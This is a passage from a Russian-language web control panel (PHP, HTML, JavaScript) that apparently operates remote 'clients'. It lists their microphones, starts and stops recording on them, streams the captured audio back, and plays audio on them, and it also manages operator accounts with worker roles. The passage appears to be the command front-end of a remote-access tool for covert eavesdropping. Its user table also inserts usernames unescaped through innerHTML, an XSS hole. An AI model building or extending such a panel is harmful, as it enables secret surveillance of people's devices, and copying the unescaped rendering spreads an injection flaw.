    document.getElementById('fileInfo').style.display = 'none';
    document.getElementById('updateButton').disabled = true;
    document.getElementById('statusInfo').style.display = 'none';

    if (updateCheckInterval) {
        clearInterval(updateCheckInterval);
        updateCheckInterval = null;
    }

    updateStartTime = null;
    isUpdateInProgress = false;
}

// Функция отмены обновления
function cancelUpdate() {
    if (updateCheckInterval) {
        clearInterval(updateCheckInterval);
        updateCheckInterval = null;
    }

    isUpdateInProgress = false;
    document.getElementById('loadingOverlay').style.display = 'none';
    resetUpdateState();
}
</script>



<div id="audio-tab" class="tab-content" style="display:none;">
    <h2><i class="fas fa-microphone"></i> Управление аудио</h2>

    <div class="audio-container">
        <!-- Выбор клиента -->
        <div class="audio-header">
            <div class="client-select">
                <div class="select-wrapper">
                    <select id="audioClientSelect">
                        <?php foreach($data['clients'] as $client_id => $client): ?>
                            <option value="<?php echo htmlspecialchars($client_id); ?>">
                                <?php echo htmlspecialchars($client_id); ?>
                            </option>
                        <?php endforeach; ?>
                    </select>
                    <div class="select-arrow"></div>
                </div>
            </div>

            <div class="audio-controls">
                <button class="audio-btn" onclick="getAudioDevices()" title="Получить аудиоустройства">
                    <i class="fas fa-refresh"></i> Обновить
                </button>
            </div>
        </div>

        <!-- Управление записью -->
        <div class="recording-controls">
            <div class="device-selector">
                <select id="audioDeviceSelect" multiple>
                    <option value="">Выберите устройство</option>
                </select>
                <div class="selected-devices" id="selectedDevices"></div>
            </div>
            <button class="record-btn" onclick="startRecording()" title="Начать запись и прослушивание">
                <i class="fas fa-microphone"></i> Начать
            </button>
            <button class="stop-btn" onclick="stopRecording()" title="Остановить запись" disabled>
                <i class="fas fa-stop"></i> Остановить
            </button>
        </div>

        <!-- Статус и управление воспроизведением -->
        <div class="playback-controls">
            <div class="status-panel">
                <div class="status-item">
                    <span class="status-label">Статус:</span>
                    <span id="streamStatus" class="status-value">Неактивно</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Текущий файл:</span>
                    <span id="currentFileInfo" class="status-value">Не выбран</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Размер:</span>
                    <span id="currentFileSize" class="status-value">0 KB</span>
                </div>
            </div>


            <div class="playback-buttons">
                <button id="playPauseBtn" class="control-btn" onclick="togglePlayPause()" disabled>

                </button>
                <button id="stopPlaybackBtn" class="control-btn" onclick="stopPlayback()" disabled>
                </button>
                <div class="volume-control">
                    <i class="fas fa-volume-up"></i>
                    <input type="range" id="volumeSlider" min="0" max="1" step="0.1" value="1" oninput="setVolume(this.value)">
                </div>
            </div>
        </div>

        <!-- Визуализатор аудио -->
        <div class="audio-visualizer">
            <canvas id="visualizerCanvas" width="600" height="80"></canvas>
        </div>


    </div>

    <!-- Карточка для воспроизведения -->
<div class="playback-card">
    <h3>Воспроизведение звука</h3>

    <!-- Поле для перетаскивания файла -->
    <div class="file-drop-area" id="fileDropArea">
        <i class="fas fa-cloud-upload-alt"></i>
        <p>Перетащите аудиофайл сюда или кликните для выбора</p>
        <input type="file" id="audioFileInput" accept="audio/*" hidden>

        <!-- Контейнер для информации о файле -->
        <div class="file-info-container" id="fileInfoContainer" style="display: none;">
            <div class="file-preview">
                <i class="fas fa-file-audio"></i>
            </div>
            <div class="file-details">
                <div class="file-name" id="fileName"></div>
                <div class="file-size" id="fileSize"></div>
            </div>
            <button class="file-remove" onclick="removeSelectedFile()">
                <i class="fas fa-times"></i>
            </button>
        </div>

        <!-- Заполнитель, когда файл не выбран -->
        <div class="file-placeholder" id="filePlaceholder">
            Файл не выбран
        </div>
    </div>

    <div class="playback-buttons">
    <button id="playBtn" class="playback-btn" onclick="playAudio()" disabled>
        <i class="fas fa-play"></i> Воспроизвести
    </button>
    <button id="stopBtn" class="playback-btn stop" onclick="stopAudio()" disabled>
        <i class="fas fa-stop"></i> Остановить
    </button>
    <!-- Кнопки регулировки громкости -->
    <button id="volumeDownBtn" class="playback-btn volume" onclick="volumeDown()">
        <i class="fas fa-volume-down"></i> Тише
    </button>
    <button id="volumeUpBtn" class="playback-btn volume" onclick="volumeUp()">
        <i class="fas fa-volume-up"></i> Громче
    </button>
</div>

    <div class="status-info" id="playbackStatus">Готово к загрузке</div>
</div>
</div>
<style>
/* Стили для карточки воспроизведения */
.playback-card {
    background: #1a1a1a;
    border-radius: 8px;
    padding: 20px;
    margin-top: 20px;
    margin-bottom: 20px;
}

.playback-card h3 {
    margin-top: 0;
    color: #d0d7d9;
    font-size: 18px;
    margin-bottom: 15px;
    font-weight: 500;
}

.file-drop-area {
    border: 1px dashed #d0d7d9;
    border-radius: 6px;
    padding: 20px;
    text-align: center;
    cursor: pointer;
    margin-bottom: 15px;
}

.file-drop-area i {
    font-size: 32px;
    color: #d0d7d9;
    margin-bottom: 10px;
}

.file-drop-area p {
    margin: 0;
    color: #d0d7d9;
    font-size: 14px;
}

/* Контейнер информации о файле */
.file-info-container {
    display: flex;
    align-items: center;
    background: #1a1a1a;
    border-radius: 6px;
    padding: 10px;
    margin-top: 15px;
    text-align: left;
}

.file-preview {
    margin-right: 10px;
}

.file-preview i {
    font-size: 20px;
    color: #d0d7d9;
}

.file-details {
    flex-grow: 1;
}

.file-name {
    font-weight: 500;
    color: #d0d7d9;
    margin-bottom: 3px;
    font-size: 14px;
    word-break: break-all;
}

.file-size {
    font-size: 12px;
    color: #d0d7d9;
    opacity: 0.8;
}

.file-remove {
    background: none;
    border: none;
    color: #d0d7d9;
    cursor: pointer;
    font-size: 14px;
    padding: 4px 6px;
    border-radius: 4px;
}

.file-placeholder {
    margin-top: 10px;
    font-size: 14px;
    color: #d0d7d9;
    opacity: 0.7;
}

.playback-buttons {
    display: flex;
    gap: 10px;
    margin-bottom: 15px;
}

.playback-btn {
    flex: 1;
    padding: 10px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-weight: 500;
    background: #1a1a1a;
    color: #d0d7d9;
    font-size: 14px;
}

.playback-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

.playback-btn.stop {
    background: #1a1a1a;
}

.status-info {
    font-size: 13px;
    color: #d0d7d9;
    text-align: center;
    opacity: 0.8;
}
</style>

<script>
// Переменные для управления аудио
let currentAudioFile = null;

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', function() {
    initFileDropArea();
});

// Инициализация области перетаскивания файла
function initFileDropArea() {
    const dropArea = document.getElementById('fileDropArea');
    const fileInput = document.getElementById('audioFileInput');

    // Обработчики для drag and drop
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        dropArea.addEventListener(eventName, preventDefaults, false);
    });

    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }

    // Подсветка области при наведении файла
    ['dragenter', 'dragover'].forEach(eventName => {
        dropArea.addEventListener(eventName, highlight, false);
    });

    ['dragleave', 'drop'].forEach(eventName => {
        dropArea.addEventListener(eventName, unhighlight, false);
    });

    function highlight() {
        dropArea.style.borderColor = '#4a6cf7';
        dropArea.style.backgroundColor = 'rgba(74, 108, 247, 0.1)';
    }

    function unhighlight() {
        dropArea.style.borderColor = '#4a6cf7';
        dropArea.style.backgroundColor = 'transparent';
    }

    // Обработка сброса файла
    dropArea.addEventListener('drop', handleDrop, false);

    function handleDrop(e) {
        const dt = e.dataTransfer;
        const files = dt.files;

        if (files.length) {
            handleFiles(files);
        }
    }

    // Обработка клика для выбора файла
    dropArea.addEventListener('click', () => {
        fileInput.click();
    });

    fileInput.addEventListener('change', function() {
        if (this.files.length) {
            handleFiles(this.files);
        }
    });
}

// Обновленная функция обработки файлов
function handleFiles(files) {
    const file = files[0];

    // Проверяем, что это аудиофайл
    if (!file.type.startsWith('audio/')) {
        updatePlaybackStatus('Ошибка: выберите аудиофайл', 'error');
        return;
    }

    currentAudioFile = file;

    // Обновляем информацию о файле
    document.getElementById('fileName').textContent = file.name;

    // Показываем информацию о файле и скрываем заполнитель
    document.getElementById('fileInfoContainer').style.display = 'flex';
    document.getElementById('filePlaceholder').style.display = 'none';

    updatePlaybackStatus('Файл готов к воспроизведению', 'success');

    // Активируем кнопки
    document.getElementById('playBtn').disabled = false;
    document.getElementById('stopBtn').disabled = false;
}

// Воспроизведение аудио
function playAudio() {
    if (!currentAudioFile) {
        updatePlaybackStatus('Ошибка: файл не выбран', 'error');
        return;
    }

    updatePlaybackStatus('Загрузка файла на сервер...', 'info');

    // Отправляем файл на сервер
    const formData = new FormData();
    formData.append('audioFile', currentAudioFile);

    fetch('upload_audio.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            updatePlaybackStatus('Воспроизведение...', 'success');

            // Отправляем команду на воспроизведение
            const clientId = document.getElementById('audioClientSelect').value;
            sendCommand(clientId, `mplay:${data.fileUrl}`);
        } else {
            updatePlaybackStatus('Ошибка загрузки: ' + data.error, 'error');
        }
    })
    .catch(error => {
        updatePlaybackStatus('Ошибка: ' + error.message, 'error');
    });
}

// Остановка воспроизведения
function stopAudio() {
    updatePlaybackStatus('Остановка воспроизведения...', 'info');

    // Отправляем команду на остановку
    const clientId = document.getElementById('audioClientSelect').value;
    sendCommand(clientId, 'mstop');

    updatePlaybackStatus('Воспроизведение остановлено', 'success');
}

// Уменьшение громкости
function volumeDown() {
    const clientId = document.getElementById('audioClientSelect').value;
    sendCommand(clientId, 'mvolume-');
    updatePlaybackStatus('Уменьшаю громкость...', 'info');
}

// Увеличение громкости
function volumeUp() {
    const clientId = document.getElementById('audioClientSelect').value;
    sendCommand(clientId, 'mvolume+');
    updatePlaybackStatus('Увеличиваю громкость...', 'info');
}

// Функция для удаления выбранного файла
function removeSelectedFile() {
    currentAudioFile = null;
    document.getElementById('audioFileInput').value = '';

    // Скрываем информацию о файле и показываем заполнитель
    document.getElementById('fileInfoContainer').style.display = 'none';
    document.getElementById('filePlaceholder').style.display = 'block';

    // Деактивируем кнопки
    document.getElementById('playBtn').disabled = true;
    document.getElementById('stopBtn').disabled = true;

    updatePlaybackStatus('Файл удален', 'info');
}

// Обновление статуса воспроизведения
function updatePlaybackStatus(message, type) {
    const statusElement = document.getElementById('playbackStatus');
    statusElement.textContent = message;

    // Очищаем предыдущие классы
    statusElement.className = 'status-info';

    // Добавляем класс в зависимости от типа сообщения
    if (type === 'error') {
        statusElement.classList.add('error');
    } else if (type === 'success') {
        statusElement.classList.add('success');
    } else if (type === 'info') {
        statusElement.classList.add('info');
    }
}

// Форматирование размера файла
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Функция отправки команды (заглушка - должна быть реализована в вашем коде)
function sendCommand(clientId, command) {
    console.log(`Отправка команды для клиента ${clientId}: ${command}`);
    // Здесь должен быть ваш код для отправки команд на сервер
}

</script>
<!-- Вкладка "Пользователи" -->
<!-- Вкладка "Пользователи" -->
<div id="users" class="tab-content" style="display:none;">
    <h2><i class="fas fa-users"></i> Управление пользователями</h2>
    <div class="user-manager">
        <button class="btn-add-user" onclick="showUserModal()">
            <i class="fas fa-plus"></i> Добавить пользователя
        </button>

        <table id="usersTable">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Логин</th>
                    <th>Роль</th>
                    <th>Действия</th>
                </tr>
            </thead>
            <tbody>
                <!-- Данные будут загружены через JavaScript -->
            </tbody>
        </table>
    </div>
</div>

<!-- Модальное окно добавления/редактирования пользователя -->
<div id="userModal" class="modals">
    <div class="modals-content">
        <span class="close" onclick="closeUserModal()">&times;</span>
        <h3 id="modalTitle">Новый пользователь</h3>
        <div class="form-group">
            <label>Логин:</label>
            <input type="text" id="userLogin" placeholder="Введите логин">
        </div>
        <div class="form-group">
            <label>Пароль:</label>
            <input type="password" id="userPassword" placeholder="Введите пароль">
        </div>
        <div class="form-group">
            <label>Роль:</label>
            <select id="userRole">
                <option value="admin lead">Лидер администраторов | admin lead</option>
                <option value="admin">Администратор | admin</option>
                <option value="Master">Работник с высоким уровнем доступа | Master</option>
                <option value="Worker">Стандартный работник | Worker</option>
                <option value="Ml. Worker">Младший работник | Ml. Worker</option>
            </select>
        </div>
        <div class="modals-actions">
            <button class="btn-cancel" onclick="closeUserModal()">Отмена</button>
            <button class="btn-confirm" onclick="saveUser()">Сохранить</button>
        </div>
    </div>
</div>

<!-- Модальное окно подтверждения удаления -->
<div id="deleteConfirmModal" class="modals">
    <div class="modals-content">
        <span class="close" onclick="closeDeleteModal()">&times;</span>
        <h3>Подтверждение удаления</h3>
        <p>Вы уверены, что хотите удалить  <span id="deleteUserName" style="font-weight: bold;"></span>?</p>
        <div class="modals-actions">
            <button class="btn-cancel" onclick="closeDeleteModal()">Отмена</button>
            <button class="btn-confirm" style="background-color: var(--danger-color);" onclick="confirmDelete()">Удалить</button>
        </div>
    </div>
</div>

<script>
    let users = [];
    let currentEditId = null;
    let usersRefreshInterval = null;
    const ROLES = {
        'admin lead': 'Лидер администраторов | admin lead',
        'admin': 'Администратор | admin',
        'Master': 'Работник с высоким уровнем доступа | Master',
        'Worker': 'Стандартный работник | Worker',
        'Ml. Worker': 'Младший работник | Ml. Worker',
    };

    // Загрузка пользователей при открытии вкладки
    document.getElementById('users').addEventListener('click', function() {
        // Запускаем автообновление при открытии вкладки
        startAutoRefresh();
        loadUsers();
    });

    // Останавливаем автообновление при переключении на другую вкладку
    function stopAutoRefresh() {
        if (usersRefreshInterval) {
            clearInterval(usersRefreshInterval);
            usersRefreshInterval = null;
        }
    }

    // Запускаем автообновление каждые 5 секунд
    function startAutoRefresh() {
        // Останавливаем предыдущий интервал, если он был
        stopAutoRefresh();

        // Запускаем новый интервал
        usersRefreshInterval = setInterval(function() {
            if (document.getElementById('users').style.display !== 'none') {
                loadUsers();
            }
        }, 5000);
    }

    // Останавливаем автообновление при скрытии вкладки
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            stopAutoRefresh();
        } else if (document.getElementById('users').style.display !== 'none') {
            startAutoRefresh();
        }
    });

    // Загрузка списка пользователей
    function loadUsers() {
        fetch('get_users.php')
            .then(response => response.json())
            .then(data => {
                users = data;
                renderUsersTable();
            })
            .catch(error => console.error('Ошибка загрузки пользователей:', error));
    }

    // Отображение таблицы пользователей
    function renderUsersTable() {
        const tbody = document.querySelector('#usersTable tbody');
        tbody.innerHTML = '';

        users.forEach(user => {
            const tr = document.createElement('tr');

            tr.innerHTML = `
                <td>${user.id}</td>
                <td>${user.username}</td>
                <td><span class="role">${ROLES[user.role] || user.role}</span></td>
                <td>
                    <button class="action-btn edit-btn" onclick="editUser(${user.id})"><i class="fas fa-edit"></i></button>
                    <button class="action-btn delete-btn" onclick="showDeleteModal(${user.id})"><i class="fas fa-trash"></i></button>
                </td>
            `;

            tbody.appendChild(tr);
        });
    }

    // Показать модальное окно для добавления/редактирования
    function showUserModal() {
        currentEditId = null;
        document.getElementById('modalTitle').textContent = 'Новый пользователь';
        document.getElementById('userLogin').value = '';
        document.getElementById('userPassword').value = '';
        document.getElementById('userRole').value = 'user';
        document.getElementById('userModal').style.display = 'block';
    }

    // Закрыть модальное окно пользователя
    function closeUserModal() {
        document.getElementById('userModal').style.display = 'none';
    }

    // Редактирование пользователя
    function editUser(id) {
        const user = users.find(u => u.id == id);
        if (user) {
            currentEditId = id;
            document.getElementById('modalTitle').textContent = 'Редактирование пользователя';
            document.getElementById('userLogin').value = user.username;
            document.getElementById('userPassword').value = '';
            document.getElementById('userRole').value = user.role;
            document.getElementById('userModal').style.display = 'block';
        }
    }

    // Сохранение пользователя
    function saveUser() {
        const login = document.getElementById('userLogin').value;
        const password = document.getElementById('userPassword').value;
        const role = document.getElementById('userRole').value;

        if (!login) {
            alert('Логин не может быть пустым');
            return;
        }

        if (!currentEditId && !password) {
            alert('Пароль не может быть пустым');
            return;
        }

        // Формируем данные для отправки
        const formData = new FormData();
        if (currentEditId) formData.append('id', currentEditId);
        formData.append('username', login);
        if (password) formData.append('password', password);
        formData.append('role', role);

        fetch('save_user.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                closeUserModal();
                loadUsers();
            } else {
                alert('Ошибка: ' + data.message);
            }
        })
        .catch(error => console.error('Ошибка сохранения пользователя:', error));
    }

    // Показать модальное окно подтверждения удаления
    function showDeleteModal(id) {
        const user = users.find(u => u.id == id);
        if (user) {
            currentEditId = id;
            document.getElementById('deleteUserName').textContent = user.username;
            document.getElementById('deleteConfirmModal').style.display = 'block';
        }
    }

    // Закрыть модальное окно подтверждения удаления
    function closeDeleteModal() {
        document.getElementById('deleteConfirmModal').style.display = 'none';
    }

    // Подтверждение удаления пользователя
    function confirmDelete() {
        if (!currentEditId) return;

        const formData = new FormData();
        formData.append('id', currentEditId);

        fetch('delete_user.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                closeDeleteModal();
                loadUsers();
            } else {
                alert('Ошибка: ' + data.message);
            }
        })
        .catch(error => console.error('Ошибка удаления пользователя:', error));
    }
</script>

<style>
/* Стили для аудио-вкладки */
.audio-container {
    padding: 20px;
    background: #1a1a1a;
    border-radius: 10px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
}

.audio-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
}

.client-select {
    flex: 1;
    margin-right: 15px;
}

.audio-controls {
    display: flex;
}

.audio-btn {
    background: #121212;
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 5px;
    cursor: pointer;
    font-size: 14px;
    transition: background 0.3s;
}

.audio-btn:hover {
    background: #121212;
}

.recording-controls {
    display: flex;
    align-items: center;
    margin-bottom: 20px;
    gap: 15px;
}

.device-selector {
    flex: 1;
    position: relative;
}

.device-selector select[multiple] {
    height: 100px;
    padding: 10px;

    border-radius: 10px;
    width: 100%;
}

.selected-devices {
    margin-top: 10px;
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
}

.device-tag {
    background: #121212;
    padding: 5px 10px;
    border-radius: 15px;
    font-size: 12px;
    display: flex;
    align-items: center;
}

.device-tag .remove {
    margin-left: 5px;
    cursor: pointer;
    color: #6c757d;
}

.record-btn, .stop-btn {
    padding: 12px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-weight: 500;
    transition: all 0.3s;
}

.record-btn {
    background: #121212;
    color: white;
}

.record-btn:hover:not(:disabled) {
    background: #121212;
}

.record-btn:disabled {
    background: #121212;
    cursor: not-allowed;
}

.stop-btn {
    background: #121212;
    color: white;
}

.stop-btn:hover:not(:disabled) {
    background: #121212;
}

.stop-btn:disabled {
    background: #121212;
    cursor: not-allowed;
}

.playback-controls {
    background: #121212;
    padding: 15px;
    border-radius: 8px;
    margin-bottom: 20px;
    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
}

.status-panel {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 15px;
    margin-bottom: 15px;
}

.status-item {
    display: flex;
    flex-direction: column;
}

.status-label {
    font-size: 12px;
    color: #bccbd3;
    margin-bottom: 5px;
}

.status-value {
    font-weight: 500;
    color: #bccbd3;
}


.control-btn {
    width: 0px;
    height: 0px;

    background: #121212;

}

.control-btn:hover:not(:disabled) {
    background: #121212;
}

.control-btn:disabled {
    background: #121212;
    cursor: not-allowed;
}

.volume-control {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-left: auto;
}

.volume-control i {
    color: #6c757d;
}

.volume-control input {
    width: 100px;
}

.audio-visualizer {
    background: #1a1a1a;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 20px;
}

#visualizerCanvas {
    width: 100%;
    height: 80px;
    display: block;
    border-radius: 4px;
}

.console-container {
    background: white;
    border-radius: 8px;
    overflow: hidden;
    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
}

.console-header {
    background: #4a6cf7;
    color: white;
    padding: 10px 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.clear-log-btn {
    background: transparent;
    border: none;
    color: white;
    cursor: pointer;
}

.console-log {
    height: 200px;
    overflow-y: auto;
    padding: 15px;
    font-family: 'Courier New', monospace;
    font-size: 12px;
    line-height: 1.5;
    background: #f8f9fa;
}

.console-log div {
    margin-bottom: 5px;
    padding-bottom: 5px;
    border-bottom: 1px solid #e9ecef;
}

.console-log div:last-child {
    border-bottom: none;
}

/* Анимация для визуализатора */
@keyframes pulse {
    0% { opacity: 0.6; }
    50% { opacity: 1; }
    100% { opacity: 0.6; }
}

.pulsing {
    animation: pulse 1.5s infinite;
}
.user-manager {
            background-color: var(--light-bg);
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .btn-add-user {
            background-color: var(--accent-color);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 20px;
            transition: background-color 0.3s;
        }


        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }

        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #2a2a2a;
        }

        th {
            background-color: var(--darker-bg);
            font-weight: bold;
        }

        tr:hover {
            background-color: #222222;
        }

        .action-btn {
            background: none;
            border: none;
            color: var(--text-color);
            cursor: pointer;
            margin-right: 10px;
            font-size: 16px;
            transition: color 0.3s;
        }



        /* Модальные окна */
        .modals {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
        }

        .modals-content {
            background-color: var(--light-bg);
            margin: 5% auto;
            padding: 20px;
            border-radius: 8px;
            width: 400px;
            max-width: 90%;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover {
            color: var(--text-color);
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input[type="text"],
        input[type="password"],
        select {
            width: 100%;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 4px;
            background-color: var(--dark-bg);
            color: var(--text-color);
            box-sizing: border-box;
        }

        .modals-actions {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 20px;
        }

        .btn-cancel {
            background-color: #555;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
        }

        .btn-confirm {

            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
        }


        }




        .role-lead {
            color: gold;
        }

        .role-user {
            color: silver;
        }
    </style>

<script>
// Глобальные переменные для управления потоком
let audioStreamInterval = null;
let lastAudioTimestamp = 0;
let isStreaming = false;
let audioQueue = [];
let isPlaying = false;
let currentAudioIndex = 0;
let audioContext = null;
let analyser = null;
let visualizationInterval = null;
let selectedDevices = [];

// Функция для логирования в консоль и на экран
function addLog(message) {
    const logElement = document.getElementById('consoleLog');
    const timestamp = new Date().toLocaleTimeString();
    const logMessage = `[${timestamp}] ${message}`;

    // Добавляем в консоль браузера
    console.log(logMessage);

    // Добавляем на экран
    if (logElement) {
        const logEntry = document.createElement('div');
        logEntry.textContent = logMessage;
        logElement.appendChild(logEntry);
        logElement.scrollTop = logElement.scrollHeight;
    }
}

// Функция для очистки лога
function clearLog() {
    const logElement = document.getElementById('consoleLog');
    if (logElement) {
        logElement.innerHTML = '';
    }
    addLog('Лог очищен');
}

// Функция для получения списка аудиоустройств
function getAudioDevices() {
    const clientId = document.getElementById('audioClientSelect').value;
    if (!clientId) {
        alert('Выберите клиента');
        return;
    }

    addLog(`Запрос аудиоустройств для клиента: ${clientId}`);

    // Используем существующую функцию отправки команды
    const command = 'micinfo';
    sendAudioCommand(command, clientId);
}

// Функция для начала записи и прослушивания
function startRecording() {
    const clientId = document.getElementById('audioClientSelect').value;
    const deviceSelect = document.getElementById('audioDeviceSelect');

    // Получаем выбранные устройства
    const selectedOptions = Array.from(deviceSelect.selectedOptions);
    const devices = selectedOptions.map(option => option.value);

    if (!clientId) {
        alert('Выберите клиента');
        return;
    }

    if (devices.length === 0) {
        showToast('info', 'Выберите хотя бы одно устройство для записи.');
        return;
    }

    addLog(`Начало записи с устройств: ${devices.join(', ')} для клиента: ${clientId}`);

    // Очищаем предыдущие записи
    clearAudioFiles(clientId);

    // Формируем команду с несколькими устройствами
    const command = 'micstart:' + devices.join(';');
    sendAudioCommand(command, clientId);
    updateRecordingStatus(true);

    // Запускаем прослушивание потока
    startAudioStream(clientId);
}

// Функция для очистки аудиофайлов перед началом записи
function clearAudioFiles(clientId) {
    const formData = new FormData();
    formData.append('action', 'clear_audio_files');
    formData.append('client_id', clientId);

    fetch('audio_api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            addLog('Аудиофайлы очищены');
        }
    })
    .catch(error => {
        addLog(`Ошибка очистки аудиофайлов: ${error}`);
    });
}

// Функция для остановки записи
function stopRecording() {
    const clientId = document.getElementById('audioClientSelect').value;
    if (!clientId) {
        alert('Выберите клиента');
        return;
    }

    addLog(`Остановка записи для клиента: ${clientId}`);

    // Используем существующую функцию отправки команды
    const command = 'micstop';
    sendAudioCommand(command, clientId);
    updateRecordingStatus(false);

    // Останавливаем прослушивание потока
    stopAudioStream();

    // Останавливаем воспроизведение
    stopPlayback();
}

// Функция для запуска аудиопотока
function startAudioStream(clientId) {
    if (audioStreamInterval) {
        clearInterval(audioStreamInterval);
    }

    isStreaming = true;
    lastAudioTimestamp = 0;
    audioQueue = [];
    currentAudioIndex = 0;

    addLog(`Запуск аудиопотока для клиента: ${clientId}`);
    document.getElementById('streamStatus').textContent = 'Активно - получение аудиопотока...';

    // Запускаем интервал для проверки новых аудиозаписей
    audioStreamInterval = setInterval(() => {
        checkForNewAudio(clientId);
    }, 1500); // Проверяем каждые 1.5 секунды для более плавного воспроизведения
}

// Функция для остановки аудиопотока
function stopAudioStream() {
    if (audioStreamInterval) {
        clearInterval(audioStreamInterval);
        audioStreamInterval = null;
    }

    isStreaming = false;
    addLog('Аудиопоток остановлен');
    document.getElementById('streamStatus').textContent = 'Неактивно';
    document.getElementById('currentFileInfo').textContent = 'Не выбран';
    document.getElementById('currentFileSize').textContent = '0 KB';
}

// Функция для проверки новых аудиозаписей
function checkForNewAudio(clientId) {
    const formData = new FormData();
    formData.append('action', 'get_audio_files');
    formData.append('client_id', clientId);

    fetch('audio_api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(files => {
        if (files.length === 0) {
            document.getElementById('streamStatus').textContent = 'Активно - ожидание данных...';
            return;
        }

        // Сортируем файлы по времени (старые сначала)
        files.sort((a, b) => a.timestamp - b.timestamp);

        // Добавляем новые файлы в очередь
        let newFilesAdded = 0;
        files.forEach(file => {
            if (file.timestamp > lastAudioTimestamp) {
                // Проверяем размер файла перед добавлением в очередь
                if (file.size > 0) {
                    audioQueue.push(file);
                    lastAudioTimestamp = file.timestamp;
                    newFilesAdded++;
                    addLog(`Добавлен файл в очередь: ${file.filename} (${(file.size/1024).toFixed(1)} KB)`);
                } else {
                    addLog(`Пропущен файл с нулевым размером: ${file.filename}`);
                }
            }
        });

        // Если есть новые файлы и не воспроизводится, начинаем воспроизведение
        if (newFilesAdded > 0 && !isPlaying) {
            playNextAudio();
        }
    })
    .catch(error => {
        addLog(`Ошибка проверки аудиофайлов: ${error}`);
        document.getElementById('streamStatus').textContent = 'Ошибка получения данных';
    });
}

// Функция для воспроизведения следующего аудиофайла
function playNextAudio() {
    if (currentAudioIndex >= audioQueue.length) {
        isPlaying = false;
        addLog('Все файлы в очереди воспроизведены');
        updatePlaybackButtons(false);
        return;
    }

    isPlaying = true;
    const file = audioQueue[currentAudioIndex];
    const clientId = document.getElementById('audioClientSelect').value;

    const audioUrl = `audio_api.php?action=get_audio_file&client_id=${encodeURIComponent(clientId)}&filename=${encodeURIComponent(file.filename)}&t=${file.timestamp}`;

    // Создаем аудио элемент
    const audioElement = new Audio(audioUrl);
    audioElement.volume = document.getElementById('volumeSlider').value;

    const sizeKB = (file.size / 1024).toFixed(1);
    const fileName = file.filename.split('/').pop();

    // Обновляем информацию о файле
    document.getElementById('currentFileInfo').textContent = fileName;
    document.getElementById('currentFileSize').textContent = `${sizeKB} KB`;

    addLog(`Воспроизведение файла: ${file.filename} (${sizeKB} KB)`);

    // Запускаем визуализацию
    setupAudioVisualization(audioElement);

    audioElement.play().catch(e => {
        addLog(`Ошибка воспроизведения: ${e}`);
        // При ошибке воспроизведения переходим к следующему файлу
        currentAudioIndex++;
        playNextAudio();
    });

    document.getElementById('streamStatus').textContent = `Воспроизведение записи от ${new Date(file.timestamp * 1000).toLocaleTimeString()}`;
    updatePlaybackButtons(true);

    // Когда аудио закончится, воспроизводим следующее
    audioElement.onended = function() {
        addLog(`Воспроизведение завершено: ${file.filename}`);
        currentAudioIndex++;

        // Плавный переход к следующему файлу
        setTimeout(() => {
            playNextAudio();
        }, 100);
    };

    // Обработчик ошибки воспроизведения
    audioElement.onerror = function() {
        addLog(`Ошибка воспроизведения файла: ${file.filename}`);
        currentAudioIndex++;
        playNextAudio();
    };
}

// Функция для настройки визуализации аудио
function setupAudioVisualization(audioElement) {
    // Останавливаем предыдущую визуализацию
    if (visualizationInterval) {
        clearInterval(visualizationInterval);
    }

    if (!audioContext) {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        analyser = audioContext.createAnalyser();
        analyser.fftSize = 256;
    }

    const source = audioContext.createMediaElementSource(audioElement);
    source.connect(analyser);
    analyser.connect(audioContext.destination);

